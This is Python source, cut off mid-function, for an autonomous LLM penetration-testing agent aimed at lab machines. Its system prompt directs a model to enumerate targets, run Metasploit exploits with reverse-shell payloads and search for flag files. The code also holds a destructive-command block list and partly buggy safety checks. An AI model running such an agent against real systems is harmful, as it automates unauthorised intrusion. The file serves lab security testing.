"""
Autonomous Red-Teaming Agent Core — Single LLM Version
Perception → Planning → Action loop using one local Ollama LLM
"""

import subprocess
import time
import json
import datetime
from openai import OpenAI
import ollama
from dataclasses import dataclass, field
from typing import Optional
import re
import argparse
import pexpect
import sys
import shlex
import os
from dotenv import load_dotenv

load_dotenv()

FLAG_PATTERNS = [
    re.compile(r'flag\{[^}]+\}', re.IGNORECASE),
    re.compile(r'[0-9a-f]{32}', re.IGNORECASE),
    re.compile(r'congratulations', re.IGNORECASE),
]

def check_for_flag(output: str) -> Optional[str]:
    """Check command output for a CTF flag in common formats."""
    for pattern in FLAG_PATTERNS:
        match = pattern.search(output)
        if match:
            return match.group(0)
    return None


# ── Data Structures ──────────────────────────────────────────────────────────

@dataclass
class AgentMemory:
    """Stores successful actions and discovered intel across iterations."""
    open_ports: dict = field(default_factory=dict)
    successful_actions: list = field(default_factory=list)
    failed_actions: list = field(default_factory=list)
    session_log: list = field(default_factory=list)
    token_usage: list = field(default_factory=list)
    available_modules: list = field(default_factory=list)

    def log(self, role: str, content: str, thinking: str):
        self.session_log.append({
            "timestamp": datetime.datetime.now().isoformat(),
            "role": role,
            "content": content,
            "thinking": thinking
        })

    def log_tokens(self, model: str, prompt_tokens: int,
                   completion_tokens: int, total_tokens: int):
        self.token_usage.append({
            "timestamp": datetime.datetime.now().isoformat(),
            "model": model,
            "prompt_tokens": prompt_tokens,
            "completion_tokens": completion_tokens,
            "total_tokens": total_tokens
        })

    def summary(self) -> str:
        return (
            f"Open ports: {json.dumps(self.open_ports, indent=2)}\n"
            f"Successful actions ({len(self.successful_actions)}): "
            f"{[a['action'] for a in self.successful_actions]}\n"
            f"Failed actions ({len(self.failed_actions)}): "
            f"{[a['action'] for a in self.failed_actions]}"
        )


@dataclass
class ActionResult:
    action: str
    command: str
    stdout: str
    stderr: str
    success: bool
    duration_seconds: float


# ── Safety Controller ─────────────────────────────────────────────────────────

class SafetyController:
    BLOCKED_COMMANDS = ["rm -rf", "mkfs", "dd if=", ":(){:|:&};:"]
    MAX_ACTIONS_PER_SESSION = 50

    def __init__(self, target_ip: str, local_ip: str):
        self.target_ip = target_ip
        self.local_ip = local_ip
        self.action_count = 0
        self.kill_switch = False

    def validate(self, command: str, target: Optional[str] = None) -> tuple:
        if target:
            print(f"TARGET: {target}")
        if self.kill_switch:
            return False, "Kill switch is active."
        if self.action_count >= self.MAX_ACTIONS_PER_SESSION:
            return False, f"Action limit ({self.MAX_ACTIONS_PER_SESSION}) reached."
        for blocked in self.BLOCKED_COMMANDS:
            if blocked in command:
                return False, f"Blocked command pattern: '{blocked}'"
        if target and target not in (self.target_ip, "N/A", self.local_ip):
            return False, f"Target '{target}' is out of scope. Only {self.target_ip} is allowed."
        return True, "OK"

    def is_allowed_netcat(command: str) -> bool:
        try:
            parts = shlex.split(command)
        except ValueError:
            return False

        if not parts:
            return True

        if parts[0] not in ("nc", "netcat"):
            return True

        flags = {
            p
            for p in parts[1:]
            if p.startswith("-")
        }

        return (
            "-z" in flags
            or "-vz" in flags
            or "-zv" in flags
            or "-nvz" in flags
            or "-vnz" in flags
            or "-znv" in flags
            or "-zvn" in flags
            or "-nzv" in flags
            or "-vzn" in flags
        ) 

    def increment(self):
        self.action_count += 1


# ── Persistent Shell ──────────────────────────────────────────────────────────

class PersistentShell:
    """
    Maintains a single long-lived bash process across agent iterations.
    Commands sent via send() share the same working directory, environment
    variables, and session state.
    """
    SENTINEL = "__CMD_DONE__"

    def __init__(self, timeout: int = 400):
        self.timeout = timeout
        self._process = subprocess.Popen(
            ["/bin/bash"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        print("[PersistentShell] bash process started.")

    def send(self, command: str) -> str:
        full = f"{command}\necho {self.SENTINEL}\n"
        self._process.stdin.write(full)
        self._process.stdin.flush()

        lines = []
        start = time.time()
        while True:
            if time.time() - start > self.timeout:
                lines.append(f"[TIMEOUT] Shell command exceeded {self.timeout}s.")
                break
            line = self._process.stdout.readline()
            if not line:
                break
            if self.SENTINEL in line:
                break
            lines.append(line)
        return "".join(lines)

    def is_alive(self) -> bool:
        return self._process.poll() is None

    def close(self):
        try:
            self._process.stdin.write("exit\n")
            self._process.stdin.flush()
            self._process.wait(timeout=5)
        except Exception:
            self._process.kill()
        print("[PersistentShell] bash process terminated.")


# ── Persistent Metasploit Channel ───────────────────────────────────────────────

class PersistentMsfconsole:
    """
    Keeps ONE msfconsole process alive for the entire engagement, instead of
    spawning a fresh one per action. This is the piece that was missing:
    Metasploit sessions and interactive shells live inside the framework
    process that opened them, so if that process exits after every action
    (as it did before, via a trailing `; exit`), there is nothing left for a
    later action to reconnect to.

    Three states are tracked:
    - plain msf console (neither in_raw_shell nor active_session_id set):
      commands are ordinary msfconsole commands (use/set/run/sessions -l/...).
    - active_session_id set: an exploit backgrounded a normal session; further
      commands are executed against it via `sessions -i <id> -c "<command>"`.
    - in_raw_shell True: the exploit dropped us directly into an interactive
      remote shell with no session to background (e.g. payload
      cmd/unix/interact, used by exploit/unix/ftp/vsftpd_234_backdoor).
      Commands are then sent straight to that shell's stdin.
    """

    PROMPTS = [
        r"msf.*?>"
    ]
    SESSION_OPENED_RE = re.compile(
        r'(?:Meterpreter|Command shell)\s+session\s+(\d+)\s+opened',
        re.I
    )
    METER_PROMPTS = [
        r"meterpreter.*?>",
        "C:\\WINDOWS\\system32>"
    ]

    def __init__(self, timeout: int = 200, startup_timeout: int = 45):
        self.timeout = timeout
        self.active_session_id: Optional[str] = None
        self.in_meterpreter: bool = False
        self.in_raw_shell: bool = False
        spawn_cmd = "env TERM=dumb MSF_DISABLE_COLORS=true msfconsole -q"
        self._child = pexpect.spawn(
            spawn_cmd,
            timeout=timeout,
            encoding="utf-8",
            codec_errors="replace",
            echo=False
        )
        try:
            self._child.expect(
                self.PROMPTS,
                timeout=startup_timeout
            )
        except pexpect.TIMEOUT:
            raise
        self._child.sendline("setg ConsoleColors false")
        self._child.expect(self.PROMPTS, timeout=10)
        try:
            while True:
                junk = self._child.read_nonblocking(
                    size=4096,
                    timeout=0.1
                )
        except pexpect.TIMEOUT:
            pass

        junk = self._child.before

        self._child.logfile_read = sys.stdout
        try:
            # pexpect always allocates a pty, which by default echoes back
            # whatever we send. Turn that off so expect() only ever matches
            # genuine child/target output, not our own input. (Best effort:
            # some programs reconfigure the tty themselves, which is why
            # send_raw_shell_command() below also defends against this.)
            self._child.delaybeforesend = 0.05
            self._child.setecho(False)
            self._child.waitnoecho(timeout=5)
        except Exception:
            pass
        print("[PersistentMsfconsole] msfconsole process started.")
    
    def verify_session(self):
        old_session = self.active_session_id
        self.active_session_id = None
        
        output = self.send_console_command("sessions -l")
        
        self.active_session_id = old_session
        
        return (
            old_session is not None and
            old_session in output
        )

    def is_alive(self) -> bool:
        return self._child.isalive()

    def _collect_trailing_output(self):
        extra = []

        while True:
            try:
                chunk = self._child.read_nonblocking(
                    size=4096,
                    timeout=0.1
                )
                extra.append(chunk)

            except pexpect.TIMEOUT:
                break

            except pexpect.EOF:
                break

        return "".join(extra)

    def _sanitize_terminal_output(self, text: str) -> str:
        """
        Remove PTY editing/control characters while preserving
        the actual visible terminal output.
        """

        result = []

        i = 0
        while i < len(text):
            ch = text[i]

            # Backspace handling
            if ch == "\x08":
                if result:
                    result.pop()
                i += 1
                continue

            # Carriage return
            if ch == "\r":
                i += 1
                continue

            # ANSI escape sequence
            if ch == "\x1b":
                j = i + 1

                if j < len(text) and text[j] == "[":
                    j += 1

                    while j < len(text):
                        if text[j].isalpha():
                            j += 1
                            break
                        j += 1

                    i = j
                    continue

            result.append(ch)
            i += 1

        cleaned = "".join(result)

        return cleaned

    def send_console_command(self, command: str) -> str:
        """Send one command at the msf6 prompt (use/set/run/sessions -l/...)."""
        CONFIRM_PATTERNS = [
            r"\[y/N\]",
            r"\[Y/n\]",
            r"Do you want to use"
        ]

        try:
            # SEND THE REAL COMMAND
            if command.startswith("search "):
                self._child.sendline(command)

                idx = self._child.expect(
                    [r"Interact with a module by name or index", "[-] No results from search"],
                    timeout=self.timeout
                )    
                output = self._child.before + self._child.after
                output += self._collect_trailing_output()

                return output
            elif command.startswith("use "):
                self._child.sendline(command)

                self._child.expect(
                    self.PROMPTS,
                    timeout=self.timeout
                )
                output = self._child.before

                output += self._collect_trailing_output()
                return output

            elif command.strip() == "run":
                self._child.sendline("run")

                EXPLOIT_PATTERNS = [
                    r"Meterpreter session \d+ opened",
                    r"Command shell session \d+ opened",
                    r"Exploit completed, but no session was created",
                    r"\[\*\] Exploit completed",
                ]

                FAIL_PATTERNS = [
                    r"Msf::OptionValidateError",
                    r"One or more options failed to validate",
                    r"Invalid option",
                    r"A SESSION or RHOST must be provided",
                    r"Failed to load module",
                ]

                output = ""

                while True:
                    idx = self._child.expect(
                        EXPLOIT_PATTERNS + FAIL_PATTERNS + self.PROMPTS,
                        timeout=self.timeout
                    )

                    output += self._child.before
                    output += self._child.after

                    if idx < len(EXPLOIT_PATTERNS):
                        # confirmed exploit completion
                        output += self._collect_trailing_output()

                        if idx == 0:
                            self.in_meterpreter = True
                        break

                    elif idx < len(EXPLOIT_PATTERNS) + len(FAIL_PATTERNS):
                        output += self._collect_trailing_output()
                        break
                    elif idx >= len(EXPLOIT_PATTERNS) + len(FAIL_PATTERNS):
                        # prompt returned, don't trust this yet
                        # collect a bit more before deciding exploit is done
                        try:
                            extra_idx = self._child.expect(
                                [
                                    r"Meterpreter session \d+ opened",
                                    r"Command shell session \d+ opened",
                                    r"Exploit completed, but no session was created",
                                ] + self.PROMPTS,
                                timeout=5
                            )

                            output += self._child.before
                            output += self._child.after

                            if extra_idx in (0, 1, 2):
                                break

                        except pexpect.TIMEOUT:
                            break

                output += self._collect_trailing_output()

                try:
                    self._child.expect(
                        self.PROMPTS,
                        timeout=5
                    )
                    output += self._child.before
                    output += self._child.after
                except pexpect.TIMEOUT:
                    pass

                match = self.SESSION_OPENED_RE.search(output)

                if match:
                    self.active_session_id = match.group(1)

                if "meterpreter session" in output.lower() or "meterpreter >" in output.lower():
                    self.in_meterpreter = True

                return output
            elif command.strip() == "show options":
                self._child.sendline(command)

                self._child.expect(
                    [r"View the full module info with the info, or info -d command"],
                    timeout=self.timeout
                )

                output = self._child.before + self._child.after

                output += self._collect_trailing_output()
                return output
            else:
                self._child.sendline(command)
                idx = self._child.expect(
                    CONFIRM_PATTERNS + self.PROMPTS,
                    timeout=self.timeout
                )
                
                if idx < len(CONFIRM_PATTERNS):
                    output = self._child.before
                    self._child.sendline("n")
                    self._child.expect(self.PROMPTS)
                    output += self._child.before
                else:
                    output = self._child.before
                    output += self._collect_trailing_output()
                  
            match = self.SESSION_OPENED_RE.search(output)
            if match:
                self.active_session_id = match.group(1)
            return output
        except pexpect.TIMEOUT:
            # No msf prompt reappeared. Most likely explanation: the exploit
            # just run dropped us straight into a raw interactive shell
            # rather than backgrounding a session.
            output = self._child.before or ""

            try:
                self._child.expect(self.PROMPTS, timeout=2)
            except:
                pass
            
            session_match = self.SESSION_OPENED_RE.search(output)
            
            if session_match:
                self.active_session_id = session_match.group(1)
                return output
                
            return output + "\n[TIMEOUT - NO SESSION DETECTED]"
        except pexpect.EOF:
            return "[msfconsole process exited unexpectedly.]"

    def send_session_command(self, command: str) -> str:
        """Run a command against the currently backgrounded target session."""

        if self.active_session_id is None:
            return ("[SESSION LOST]")
        if self.active_session_id is None:
            return ("[AGENT ERROR] No active Metasploit session — run an "
                     "exploit that opens a session before issuing "
                     "post-exploitation commands.")
        escaped = command.replace('"', '\\"')
        return self.send_console_command(
            f'sessions -i {self.active_session_id} -c "{escaped}"'
        )

    def send_meterpreter_command(self, command):

        self._child.sendline(command)

        self._child.expect(
            self.METER_PROMPTS,
            timeout=self.timeout
        )

        output = self._child.before
        output += self._child.after
        output += self._collect_trailing_output()

        return output

    def send_raw_shell_command(self, command: str) -> str:
        """
        Run a command directly in the raw interactive shell obtained on the
        target. Relies on setecho(False) in __init__ so that only genuine
        output (not our own sent bytes) can match; this was verified against
        pexpect's pty handling, but if a particular msfconsole build resets
        terminal echo itself, output could in principle include a leading
        copy of the command before its real result. Worth spot-checking the
        first time this runs against a real exploit.
        """
        sentinel = "__MSF_SHELL_DONE__"
        self._child.sendline(f"{command}; echo {sentinel}")
        try:
            idx = self._child.expect([sentinel] + self.PROMPTS, timeout=self.timeout)

            output = self._child.before
            if idx == 1:
                # We're back at the msf prompt — the remote shell/session ended.
                self.in_raw_shell = False
            return output
        except pexpect.TIMEOUT:
            return f"[TIMEOUT] Remote shell command exceeded {self.timeout}s."
            
        except pexpect.EOF:
            self.in_raw_shell = False
            return "[msfconsole process exited unexpectedly — remote shell lost.]"

    def send(self, command: str) -> str:
        """Dispatch a command to whichever channel currently represents the target."""

        if "\n" in command:
            cmds = [
                c.strip()
                for c in command.splitlines()
                if c.strip()
            ]

            outputs = []

            for c in cmds:
                outputs.append(self.send(c))

            return "\n".join(outputs)

        if ";" in command:
            cmds = [
                c.strip()
                for c in command.split(";")
                if c.strip()
            ]

            outputs = []

            for c in cmds:
                outputs.append(self.send(c))

            return "\n".join(outputs)

        if self.in_raw_shell:
            return self.send_raw_shell_command(command)
        if self.in_meterpreter:
            return self.send_meterpreter_command(command)
        if self.active_session_id:
            return self.send_session_command(command)

        
        # COMMAND REPAIRS
        if command.startswith("run "):
            command = "run"
        if command.startswith("show options "):
            command = "show options"

        return self.send_console_command(command)

    def launch_exploit(self, msf_x_payload: str) -> str:
        """
        Feed a semicolon-separated msfconsole `-x` payload (e.g.
        'use module; set RHOSTS 10.10.10.5; run') into the persistent
        console one statement at a time. Any trailing 'exit' is dropped:
        this process's lifecycle belongs to ToolExecutor.close(), not to a
        single action, since killing it would also kill any session or
        shell it just opened on the target.
        """
        statements = [
            s.strip() for s in msf_x_payload.split(";")
            if s.strip() and s.strip().lower() != "exit"
        ]
        chunks = []
        for stmt in statements:
            chunks.append(self.send(stmt))
            if self.in_raw_shell or self.active_session_id:
                # 'run' already produced a foothold; remaining statements (if
                # any) would no longer be valid msf-console syntax.
                break
        return "\n".join(chunks)

    def close(self):
        try:
            if self.in_raw_shell:
                self._child.sendline("exit")
            self._child.sendline("exit -y")
            self._child.expect(pexpect.EOF, timeout=10)
        except Exception:
            pass
        try:
            self._child.close(force=True)
        except Exception:
            pass
        print("[PersistentMsfconsole] msfconsole process terminated.")


# ── Tool Layer ────────────────────────────────────────────────────────────────

class ToolExecutor:
    """Executes security tools and returns structured results."""

    # Tools that always run locally on the attacker box, regardless of
    # whether a target foothold is currently active. Everything NOT in this
    # set (ls, cd, find, cat, whoami, id, ps, ...) is treated as ambiguous:
    # once we have a live session/shell on the target, those commands are
    # routed there instead of local bash — that ambiguity is exactly what
    # caused post-exploitation commands to run locally before this fix.
    LOCAL_ONLY_TOOLS = {
        "nmap", "ping", "curl", "wget", "ftp", "ssh", "nc", "netcat",
        "gobuster", "dirb", "nikto", "searchsploit", "msfconsole",
        "hydra", "smbclient", "snmpwalk", "sqlmap",
    }

    def __init__(self, safety: SafetyController, local: str, timeout: int = 400):
        self.safety = safety
        self.timeout = timeout
        self._shell = PersistentShell(timeout=timeout)
        self._msf: Optional[PersistentMsfconsole] = None
        self.HTB_LHOST = local

    def _get_msf(self) -> PersistentMsfconsole:
        if self._msf is None or not self._msf.is_alive():
            self._msf = PersistentMsfconsole(timeout=self.timeout)
        return self._msf

    def _has_active_foothold(self) -> bool:
        """True once an exploit has given us a live session or raw shell on the target."""
        return self._msf is not None and (
            self._msf.in_raw_shell or self._msf.active_session_id is not None
        )

    @classmethod
    def _is_local_only_tool(cls, stripped_command: str) -> bool:
        tokens = stripped_command.split()
        first_token = tokens[0].lower() if tokens else ""
        return first_token in cls.LOCAL_ONLY_TOOLS

    @staticmethod
    def _extract_x_payload(command: str) -> str:
        """Pull the quoted argument out of `msfconsole -q -x "..."`."""
        match = re.search(r'-x\s+"((?:[^"\\]|\\.)*)"', command)
        if not match:
            match = re.search(r"-x\s+'((?:[^'\\]|\\.)*)'", command)
        return match.group(1) if match else ""

    def _run_via_msf(self, command: str, is_exploit_launch: bool) -> ActionResult:
        """Route a command through the persistent Metasploit channel (see PersistentMsfconsole)."""
        print(f"[EXECUTOR] ENTERED _run_via_msf: {command}")
        msf = self._get_msf()
        start = datetime.datetime.now()

        if command.strip() == "run":
            msf.timeout = max(msf.timeout, 180)

        command = re.sub(r"\s+-q$", "", command)

        command = re.sub(r"set\s+lhost\b[^\n;]*", f"set LHOST {self.HTB_LHOST}", command, flags=re.I)

        INVALID_PREFIXES = (
            "RHOSTS ",
            "LHOST ",
            "RPORT ",
            "PAYLOAD "
        )
        
        for prefix in INVALID_PREFIXES:
            if command.startswith(prefix):
                command = "set " + command

        if re.search(
            r"set\s+\w+.*set\s+\w+",
            command,
            re.I
        ):
            return ActionResult(
                action="msfconsole",
                command=command,
                stdout="Multiple set commands detected",
                stderr="Invalid syntax",
                success=False,
                duration_seconds=0,
            )

        if re.match(r'^[A-Z_]+=', command):
            variable, value = command.split("=", 1)
            command = f"set {variable} {value}"

        if is_exploit_launch and not (msf.in_raw_shell or msf.active_session_id):
            output = msf.launch_exploit(self._extract_x_payload(command))
        elif is_exploit_launch:
            # We already have a foothold; the model wrapped a follow-up
            # command in msfconsole syntax by mistake. Run its statements
            # against the live target connection instead of re-entering msf.
            statements = [
                s.strip() for s in self._extract_x_payload(command).split(";")
                if s.strip() and s.strip().lower() != "exit"
            ]
            output = "\n".join(msf.send(stmt) for stmt in statements) if statements else ""
        else:
            print(f"[EXECUTOR] CALLING MSF SEND")
            if "&&" in command:
                outputs = []

                for part in command.split("&&"):
                    part = part.strip()

                    if not part:
                        continue

                    outputs.append(msf.send(part))

                output = "\n".join(outputs)

            else:
                output = msf.send(command)

        lower = output.lower()

        success = not any([
            "failed" in lower,
            "error" in lower,
            "unknown command" in lower,
            "optionvalidateerror" in lower,
            "no session was created" in lower,
            "exploit aborted due to failure" in lower,
            "no results from search" in lower,
            "unknown datastore option" in lower,
            "did you mean" in lower,
            "optionvalidateerror" in lower,
            "failed to validate" in lower,
            "one or more options failed to validate" in lower,
            "no active sessions" in lower,
            "dependencies" in lower,
            "invalid parameter" in lower
        ])

        duration = (datetime.datetime.now() - start).total_seconds()
        channel = (
            "raw-shell" if msf.in_raw_shell else
            f"session-{msf.active_session_id}" if msf.active_session_id else
            "msf-console"
        )
        print(f"  [PersistentMsfconsole:{channel}] ran: {command}")

        output = msf._sanitize_terminal_output(output)

        output = remove_prompt_echoes(output)

        return ActionResult(
            action="msfconsole", command=command,
            stdout=output, stderr="",
            success=success, duration_seconds=duration
        )

    def run(self, command: str, target: Optional[str] = None) -> ActionResult:
        """Run a single command in a fresh subprocess."""
        print(f"[EXECUTOR] COMMAND={command}")
        command = self._fix_msfconsole(command)
        stripped = command.strip()
        print(f"[EXECUTOR] COMMAND FIXED={command}")

        ok, reason = self.safety.validate(command, target)
        if not ok:
            return ActionResult(
                action="blocked", command=command,
                stdout="", stderr=f"SAFETY BLOCK: {reason}",
                success=False, duration_seconds=0.0
            )

        NETCAT_KEYWORDS = (
            "nc",
            "netcat"
        )

        if command.startswith(NETCAT_KEYWORDS):
            if not self.safety.is_allowed_netcat(command):
                reason = "Interactive netcat commands are not permitted. Use netcat with the -z flag."
                return ActionResult(
                    action="blocked", command=command,
                    stdout="", stderr=f"SAFETY BLOCK: {reason}",
                    success=False, duration_seconds=0.0
                )


        MSF_KEYWORDS = (
            "search ",
            "use ",
            "set ",
            "run",
            "exploit",
            "sessions",
            "background",
            "show ",
            "info",
            "check"
        )

        METER_KEYWORDS = (
            "ls",
            "pwd",
            "dir",
            "search",
            "cat",
            "find"
        )


        if stripped.startswith(MSF_KEYWORDS):
            return self._run_via_msf(
                command,
                is_exploit_launch=False
            )

        if stripped.startswith(METER_KEYWORDS):
            return self._run_via_msf(
                command,
                is_exploit_launch=False
            )

        # msfconsole must always go through the persistent channel — a
        # one-shot invocation cannot keep a session alive across iterations.
        if stripped.startswith("msfconsole"):
            self.safety.increment()
            return self._run_via_msf(command, is_exploit_launch=True)

        # Once we have a foothold on the target, ambiguous shell/filesystem
        # commands belong there, not on the local machine — regardless of
        # how this action was dispatched.
        if self._has_active_foothold() and not self._is_local_only_tool(stripped):
            self.safety.increment()
            return self._run_via_msf(command, is_exploit_launch=False)

        self.safety.increment()
        start = datetime.datetime.now()
        try:
            result = subprocess.run(
                command, shell=True, capture_output=True,
                text=True, timeout=self.timeout
            )
            duration = (datetime.datetime.now() - start).total_seconds()
            return ActionResult(
                action=command.split(),
                command=command,
                stdout=result.stdout,
                stderr=result.stderr,
                success=(result.returncode == 0),
                duration_seconds=duration
            )
        except subprocess.TimeoutExpired:
            return ActionResult(
                action=command.split()[0], command=command,
                stdout="", stderr="TIMEOUT",
                success=False, duration_seconds=self.timeout
            )

    def run_persistent(self, command: str,
                       target: Optional[str] = None) -> ActionResult:
        """Run a command in the persistent bash session, or on the target if we have a foothold."""
        print(f"[EXECUTOR] COMMAND={command}")
        command = self._fix_msfconsole(command)
        stripped = command.strip()
        print(f"[EXECUTOR] COMMAND FIXED={command}")

        if " run" in command.lower() and command.lower().startswith("set "):
            return ActionResult(
                success=False,
                stdout="Invalid combined command",
                stderr="",
                action="msfconsole",
                command=command,
                duration_seconds=0
            )


        ok, reason = self.safety.validate(command, target)
        if not ok:
            return ActionResult(
                action="blocked", command=command,
                stdout="", stderr=f"SAFETY BLOCK: {reason}",
                success=False, duration_seconds=0.0
            )

        MSF_KEYWORDS = (
            "search ",
            "use ",
            "set ",
            "run",
            "exploit",
            "sessions",
            "background",
            "show ",
            "info ",
            "check"
        )


        if stripped.startswith(MSF_KEYWORDS):
            return self._run_via_msf(
                command,
                is_exploit_launch=False
        )

        # Same routing rule as run(): msfconsole always uses the persistent
        # msf channel, and once we have a target foothold, ambiguous
        # shell/filesystem commands go there too instead of local bash.
        # This is the fix for the reported bug — these were exactly the
        # commands (cd/ls/find/cat looking for flags) that used to silently
        # land in the local shell once persistent_shell was set to true.
        if stripped.startswith("msfconsole"):
            self.safety.increment()
            return self._run_via_msf(command, is_exploit_launch=True)

        if self._has_active_foothold() and not self._is_local_only_tool(stripped):
            self.safety.increment()
            return self._run_via_msf(command, is_exploit_launch=False)

        if not self._shell.is_alive():
            print("  [PersistentShell] Shell died — restarting.")
            self._shell = PersistentShell(timeout=self.timeout)

        self.safety.increment()
        start = datetime.datetime.now()
        output = self._shell.send(command)
        duration = (datetime.datetime.now() - start).total_seconds()

        print(f"  [PersistentShell] ran: {command}")
        return ActionResult(
            action=command.split()[0],
            command=command,
            stdout=output,
            stderr="",
            success=True,
            duration_seconds=duration
        )

    @staticmethod
    def _fix_msfconsole(command: str) -> str:
        stripped = command.strip()
        if not stripped.startswith("msfconsole"):
            return command
        if "-q" not in stripped:
            return stripped.replace("msfconsole", "msfconsole -q", 1)
        return command

    def close(self):
        self._shell.close()
        if self._msf is not None:
            self._msf.close()



AGENT_SYSTEM_PROMPT = """You are an autonomous penetration testing agent operating in a controlled lab environment.

For every iteration:

1. Evaluate the previous action.
2. Reason about the current state.
3. Output the exact next command.

PREVIOUS ACTION EVALUATION

Evaluate success using stdout and stderr.

last_action_success must be true only if the intended objective was achieved.

Set last_action_success to false for:
- exploit failure
- authentication failure
- connection failure
- unknown command
- unknown datastore option
- failed to load module
- no useful result
- no session created
- option validation errors

Use actual output, not exit status alone.

last_action_assessment should briefly explain the evidence.

REASONING

Determine:

1. Current findings.
2. Current phase.
3. Best next action.
4. Best tool.
5. Whether flags may already be accessible.

During the enumeration phase, determine whenever possible:

- Operating system
- Operating system version
- Architecture (x86/x64)
- Open ports
- Running services
- Domain/workgroup information
- User accounts
- Potential vulnerabilities

Before selecting an exploit, check whether the collected host information matches the exploit requirements.

TOOLS

nmap
ping
curl
wget
ftp
ssh
nc
netcat
gobuster
dirb
nikto
searchsploit
msfconsole
hydra
smbclient
snmpwalk
sqlmap
find
cat
ls
whoami
uname
ps
netstat
id

FLAG LOCATIONS

/root/root.txt
/root/flag.txt
/home/*/user.txt
/home/*/local.txt

If the target is Windows:

Do not search:
- /root
- /home

Search:
C:\\Users\\*\\Desktop\

PERSISTENT SHELL RULES

persistent_shell = true when shell state must survive between commands.

Examples:
- cd then ls
- filesystem navigation
- post-exploitation activity
- privilege escalation

persistent_shell = false for stateless tools.

Examples:
- nmap
- gobuster
- searchsploit
- hydra
- sqlmap

Once a foothold exists, filesystem commands automatically run on the target.

METASPLOIT RULES

IMPORTANT:
A persistent Metasploit console already exists.

Never run:
- msfconsole
- msfconsole -q
- msfconsole -q -x

These commands are forbidden.

Forbidden commands:
exploit/multi/handler
exploit/multi/handler -i

To inspect active sessions use:
sessions -l

Issue exactly ONE Metasploit command per response.

Never use:
- &&
- ;
- -x
- run arguments

Valid commands:

search smb

use exploit/windows/smb/ms17_010_eternalblue

show options

set RHOSTS 10.129.x.x

run

Required workflow:

1. search <keyword>
2. use <module>
3. show options
4. set required parameters
5. run

Do not run the exploit until required parameters have been configured.

Always explicitly set LHOST before executing any exploit that uses a reverse-shell payload, even if LHOST already contains a value.

MODULE RULES

Only use modules that appeared in previous search output.

Never invent module names.

If a module did not appear in search results, do not use it.

Available Metasploit modules are provided in the state.

You may only use modules listed in Available Metasploit modules.

If a module is not listed, it is forbidden.

EXPLOIT FAILURE RULES

Treat these as failures:

- Exploit completed, but no session was created
- Exploit aborted due to failure
- Failed to load module
- No results from search
- Unknown command
- Unknown datastore option
- OptionValidateError

Do not immediately repeat a failed exploit.

IMPORTANT

exploit/multi/handler is not an exploit.

Use it only after successful exploitation requires a listener.

Never use it for initial access.

RESPONSE FORMAT

Return JSON only.

{
  "last_action_success": null,
  "last_action_assessment": "not applicable on the first iteration",
  "reasoning": "brief reasoning",
  "phase": "recon|vuln_id|exploitation|privesc|flag_capture|complete",
  "action": "one sentence describing the next step",
  "target": "target IP",
  "risk": "low|medium|high",
  "command": "single command only",
  "persistent_shell": false
}"""

OPENAI_MODELS = [
    "gpt-6-luna",
    "gpt-5.6-luna",
    "gpt-4o-mini",
    "gpt-5.6-sol",
    "gpt-5.6-terra",
]
class SingleLLMPlanner:
    def __init__(self, model: str, target_ip: str, local_ip: str):
        self.model = model
        self.target_ip = target_ip
        self.local_ip = local_ip
        self.history: list = []
        if model in OPENAI_MODELS:
            OPENAI_API_KEY=os.getenv("KEY")
            self.client = OpenAI(api_key=OPENAI_API_KEY)
        else:
            self.client = ""

    @staticmethod
    def _extract_json(raw: str) -> str:
        """Robustly extract a JSON object from LLM output."""
        raw = raw.strip()
        start = raw.find("{")
        end = raw.rfind("}") + 1
        if start != -1 and end > start:
            candidate = raw[start:end]
            try:
                json.loads(candidate)
                return candidate
            except json.JSONDecodeError:
                pass
        if "```" in raw:
            parts = raw.split("```")
            for part in parts:
                part = part.strip()
                if part.startswith("json"):
                    part = part[4:].strip()
                if part.startswith("{"):
                    try:
                        json.loads(part)
                        return part
                    except json.JSONDecodeError:
                        continue
        return raw

    def _call(self, messages: list) -> dict:
        """Single ollama.chat call using AGENT_SYSTEM_PROMPT."""
        if self.model in OPENAI_MODELS:
            response = self.client.responses.create(
                model=self.model,
                instructions=AGENT_SYSTEM_PROMPT,
                input=messages,
                reasoning={"effort": "high"},
            )

            usage = response.usage

            return {
                "content": response.output_text,
                "thinking": "",
                "prompt_tokens": usage.input_tokens,
                "completion_tokens": usage.output_tokens,
                "total_tokens": (
                    usage.input_tokens +
                    usage.output_tokens
                ),
            }
        else:
            response = ollama.chat(
                model=self.model,
                messages=[
                    {"role": "system", "content": AGENT_SYSTEM_PROMPT},
                    *messages
                ],
                think=True,
                stream=False,
                options={"num_ctx": 65536}
            )
            try:
                content  = response.message.content
                thinking = response.message.thinking
            except AttributeError:
                content  = response["message"]["content"]
                thinking = response["message"].get("thinking", "")

            try:
                prompt_tokens     = response.prompt_eval_count or 0
                completion_tokens = response.eval_count        or 0
            except AttributeError:
                prompt_tokens     = response.get("prompt_eval_count", 0) or 0
                completion_tokens = response.get("eval_count",        0) or 0

            return {
                "content":           content,
                "thinking":          thinking,
                "prompt_tokens":     prompt_tokens,
                "completion_tokens": completion_tokens,
                "total_tokens":      prompt_tokens + completion_tokens,
            }

    def plan(
        self,
        state: str,
        memory: AgentMemory,
        flags_found: list,
        last_result: Optional[ActionResult] = None,
        last_plan: Optional[dict] = None,
    ) -> dict:
        """
        Single API call that evaluates the previous action (when present) and
        returns the next reasoning + command together.
        """
        if last_result is not None:
            previous_action = (
                f"Previous command:\n{last_result.command}\n\n"
                f"Framework success evaluation: {last_result.success}\n\n"
                f"Previous stdout:\n{last_result.stdout[:3000] or '[empty]'}\n\n"
                f"Previous stderr:\n{last_result.stderr[:1000] or '[empty]'}\n\n"
                f"Previous intended action:\n"
                f"{(last_plan or {}).get('action', 'Unknown')}\n\n"
                "Evaluate that previous action semantically from the command and "
                "stdout/stderr before planning the next action."
            )
        else:
            previous_action = (
                "There is no previous action to evaluate. "
                "Set last_action_success to null."
            )

        user_input = (
            f"Target: {self.target_ip}\n\n"
            f"Local VPN IP: {self.local_ip}\n\n"
            f"Current system state:\n{state}\n\n"
            f"Memory summary:\n{memory.summary()}\n\n"
            f"Flags found so far: {flags_found if flags_found else 'None yet.'}\n\n"
            f"Actions already taken:\n"
            f"{[a['action'] for a in memory.successful_actions[-8:]]}\n\n"
            f"Commands already run:\n"
            f"{[a['command'] for a in memory.successful_actions[-8:]]}\n\n"
            f"{previous_action}\n\n"
            "Analyse the situation, evaluate the previous action when provided, "
            "reason about the next step, and produce the exact shell command to run. "
            "Respond with JSON only — no text outside the JSON object."
        )

